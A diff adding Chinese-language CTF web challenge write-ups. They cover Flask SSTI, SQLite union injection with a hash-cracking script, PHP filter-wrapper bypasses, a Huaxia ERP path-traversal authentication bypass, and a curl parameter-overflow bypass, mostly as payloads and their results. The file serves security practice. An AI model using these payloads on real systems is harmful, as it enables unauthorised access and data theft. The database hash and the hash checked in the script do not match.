@@ -1,0 +1,332 @@
+-->> Cat   django框架代码知识:
+#测试url
+GET /index.php?url=127.0.0.1 #发现命令注入，无法注入
+
+#实际不能绕过注入, 字符fuzz
+GET /index.php?url=%BF  # %BF = @
+
+#访问url
+GET /index.php?url=@
+
+#得到报错信息
+DATABASES   
+{'default': {'ATOMIC_REQUESTS': False,
+             'AUTOCOMMIT': True,
+             'CONN_MAX_AGE': 0,
+             'ENGINE': 'django.db.backends.sqlite3',
+             'HOST': '',
+             'NAME': '/opt/api/database.sqlite3',  # sqlite 数据库
+             'OPTIONS': {},
+             'PASSWORD': u'********************',
+             'PORT': '',
+             'TEST': {'CHARSET': None,
+                      'COLLATION': None,
+                      'MIRROR': None,
+                      'NAME': None},
+             'TIME_ZONE': None,
+             'USER': ''}}
+
+
+#访问数据库
+GET /index.php?url=@/opt/api/database.sqlite3
+
+#得到报错信息，flag在里面
+WHCTF{yoooo_Such_A_G00D_@}
+
+
+-->> Confusion1  python flask  SSTI模板注入:
+#点击home
+http://61.147.171.105:62048/index.php   #以为PHP网站，伪造的
+
+#点击login
+<!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt-->  #flag文件
+<!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt-->
+
+#需要找到能读取文件的地方，没有找到url传参的地方，测试SSTI模板注入
+http://61.147.171.105:62048/{{2*5}}   #404 /10 模板被执行
+
+#服务器实际为python编写的
+Server: Werkzeug/0.14.1 Python/2.7.15   #python flask 框架
+
+#test1
+111.200.241.244:61908/{{".__class__"}}  #:Nope!Find another way
+
+#test2
+111.200.241.244:61908/{{''[request.args.a]}}?a=__class__ #:<type'str'>
+# '' 表示 字符串
+
+#test3
+111.200.241.244:61908/{{''[request.args.a][request.args.b]}}?
+a=__class__&b=__mro__
+
+#test4
+111.200.241.244:61908/{{''[request.args.a][request.args.b][2][request.args.c]}}?
+a=__class__&b=__mro__&c=__subclasses__
+
+#test5
+111.200.241.244:61908/{{''[request.args.a][request.args.b][2][request.args.c]
+()}}?a=__class__&b=__mro__&c=__subclasses__  #:NO Found
+
+#test6
+111.200.241.244:61908/{{''[request.args.a][request.args.b][2][request.args.c]()
+[40]()}}?a=__class__&b=__mro__&c=__subclasses__
+
+#test7 最后一步
+http://111.200.241.244:61908/%7B%7B''[request.args.a][request.args.b][2]
+[request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')
+[request.args.d]()%7D%7D?a=__class__&b=__mro__&c=__subclasses__&d=read
+#cyberpeace{d58af5ebc4ac6edd39b1de0f91428e0b}
+
+
+-->> flatScience sqlite3-SQL注入 + (python脚本编写找单词 + salt = ‘散列值’):
+#翻目录，没找到有用的，用dirsearch.py扫描网站目录
+python dirsearch.py -u  http://61.147.171.105:61479/
+# login.php robots.txt
+
+http://61.147.171.105:61479/robots.txt
+# User-agent: *
+# Disallow: /login.php
+# Disallow: /admin.php
+
+http://61.147.171.105:61479/admin.php  #提示不在这个文件
+
+http://61.147.171.105:61479/login.php
+#得到 ?debug   调试参数
+
+http://61.147.171.105:61479/login.php?debug=1  
+#得到login.php源代码
+<?php
+if(isset($_POST['usr']) && isset($_POST['pw'])){
+        $user = $_POST['usr'];
+        $pass = $_POST['pw'];
+
+        $db = new SQLite3('../fancy.db');
+        
+        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
+    if($res){
+        $row = $res->fetchArray();
+    }
+    else{
+        echo "<br>Some Error occourred!";
+    }
+
+    if(isset($row['id'])){
+            setcookie('name',' '.$row['name'], time() + 60, '/');
+            header("Location: /");
+            die();
+    }
+
+}
+
+if(isset($_GET['debug']))
+highlight_file('login.php');
+?>
+<!-- TODO: Remove ?debug-Parameter! --> 
+# password = sha1($pass + "Salz!")
+
+#构筑 sqlite3  注入
+usr=' union SELECT sql,sql FROM sqlite_master WHERE tbl_name = 'Users' and type = 'table'--+&pw=222
+
+#查找 Users  表的数据
+usr=' union select id, id from Users limit 1,1  # 1
+usr=' union select name, name from Users limit 1,1 # admin
+usr=' union select pass, word from Users limit 1,1 # 34b0bb7c304949f9ff2fc101eef0f048be10d3bd
+usr=' union select hint, hint from Users limit 1,1 # my fav word in my fav paper?!
+#得出 PDF文档里面的单词word  加上  字符串“Salz!”  等于 34b0bb7c304949f9ff2fc101eef0f048be10d3bd
+# password = sha1(word + "Salz!")
+
+# wget  提取网站所有的PDF文档
+wget http://61.147.171.105:61479/ -r -np -nd -A .pdf
+
+#使用python脚本  将每个word + "Salz!"  与  34b0bb7c304949f9ff2fc101eef0f048be10d3bd 比较，相等的就是密码
+from cStringIO import StringIO
+from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
+from pdfminer.converter import TextConverter
+from pdfminer.layout import LAParams
+from pdfminer.pdfpage import PDFPage
+import sys
+import string
+import os
+import hashlib
+ 
+def get_pdf():
+    return [i for i in os.listdir("./") if i.endswith("pdf")]
+ 
+ 
+def convert_pdf_2_text(path):
+    rsrcmgr = PDFResourceManager()
+    retstr = StringIO()
+    device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams())
+    interpreter = PDFPageInterpreter(rsrcmgr, device)
+    with open(path, 'rb') as fp:
+        for page in PDFPage.get_pages(fp, set()):
+            interpreter.process_page(page)
+        text = retstr.getvalue()
+    device.close()
+    retstr.close()
+    return text
+ 
+ 
+def find_password():
+    pdf_path = get_pdf()
+    for i in pdf_path:
+        print "Searching word in " + i
+        pdf_text = convert_pdf_2_text(i).split(" ")
+        for word in pdf_text:
+            sha1_password = hashlib.sha1(word+"Salz!").hexdigest()
+            if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c':
+                print "Find the password :" + word
+                exit()
+ 
+if __name__ == "__main__":
+    find_password()
+#得到密码为ThinJerboa
+
+#登陆admin.php,得到flag
+flag{Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?} 
+
+
+-->> 题目名称-文件包含  考验 filter 文件包含的各种方式:
+#题目给出的代码
+<?php
+highlight_file(__FILE__);
+    include("./check.php");
+    if(isset($_GET['filename'])){
+        $filename  = $_GET['filename'];
+        include($filename);
+    }
+?>
+
+#构造payload-1
+?filename=php://filter/read=convert.base64-encode/resource=./check.php  #被检测到 hack
+
+#构造payload-2 
+?filename=php://filter/read=convert.quoted-printable-encode/resource=./check.php  #被检测到 hack
+
+#构造payload-3
+/?filename=php://filter/convert.iconv.UTF-8.UTF-7/resource=./check.php  #被检测到 error
+
+#convert.iconv.[]过滤器，使用其他编码格式
+UCS-4*
+UCS-4BE
+UCS-4LE*
+UCS-2
+UCS-2BE
+UCS-2LE
+UTF-32*
+UTF-32BE*
+UTF-32LE*
+UTF-16*
+UTF-16BE*
+UTF-16LE*
+UTF-7
+UTF7-IMAP
+UTF-8*
+ASCII*
+EUC-JP*
+SJIS*
+eucJP-win*
+SJIS-win*
+
+#逐个尝试  使用其他编码
+?filename=php://filter//convert.iconv.UCS-4BE/resource=./check.php
+
+?filename=php://filter//convert.iconv.UCS-4LE*/resource=./check.php
+#这个可以读取文件
+
+#check.php源代码   三个检测
+preg_match("/base|quoted|write|rot13|read|zlib|print|string/i", $_GET["filename"]) #hack
+preg_match("/BE|16|8|32|2/i", $_GET["filename"])  #error
+preg_match("/4\*/i", $_GET["filename"]) #error
+
+#payload-4  下面三种都能绕过  并读取文件
+?filename=php://filter//convert.iconv.SJIS*.UCS-4*/resource=/var/www/html/flag.php
+
+?filename=php://filter//convert.iconv.UTF-7.UCS-4*/resource=/var/www/html/flag.php
+
+?filename=php://filter//convert.iconv.EUC-JP*.UCS-4*/resource=/var/www/html/flag.php
+
+#读取flag文件
+<?php //cyberpeace{8c08154a8a824bcc7d54d72f1d8b9164};
+
+
+-->> eabypass-cat  华夏ERP的未授权访问漏洞:
+
+#访问登录js
+/js/modules/sys/sysLogin.js
+/*!
+ * Copyright (c) 2013-Now 华夏erp All rights reserved.
+ *
+ * @author jishenghua
+ * @version 2019-09-14
+ */
+
+#搜索 华夏erp 漏洞
+其中值得关注的是ignoredList，如果url中存在ignoredList则不需要认证
+#匹配值为 .css#.js#.jpg#.png#.gif#.ico
+
+#构造payload
+GET /favicon.ico/../flag.html
+# cyberpeace{6c4c07820055ff48d5bec3dff6db0fcf}
+
+
+
+-->> ez_curl  考php校验绕过:
+highlight_file(__FILE__);
+$url = 'http://back-end:3000/flag?';
+$input = file_get_contents('php://input');
+$headers = (array)json_decode($input)->headers;
+for($i = 0; $i < count($headers); $i++){
+    $offset = stripos($headers[$i], ':');
+    $key = substr($headers[$i], 0, $offset);
+    $value = substr($headers[$i], $offset + 1);
+    if(stripos($key, 'admin') > -1 && stripos($value, 'true') > -1){
+        die('try hard');
+    }
+}
+$params = (array)json_decode($input)->params;
+$url .= http_build_query($params);
+$url .= '&admin=false';
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_TIMEOUT_MS, 5000);
+curl_setopt($ch, CURLOPT_NOBODY, FALSE);
+$result = curl_exec($ch);
+curl_close($ch);
+echo $result;
+
+#payload
+{
+    "headers":[
+        "admin: t",
+        " true: t"
+    ],
+    "params":{  #通过传 无用参数1000，把$url .= '&admin=false'; 这段传参给挤掉
+        "admin":"t",
+        "2":"1",
+        "3":"1",
+        ...
+        "999":"1",
+        "1000":"1"
+    }
+}
+#CatCTF{23aaaab824aadf15eb19f4236f3e3b51}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
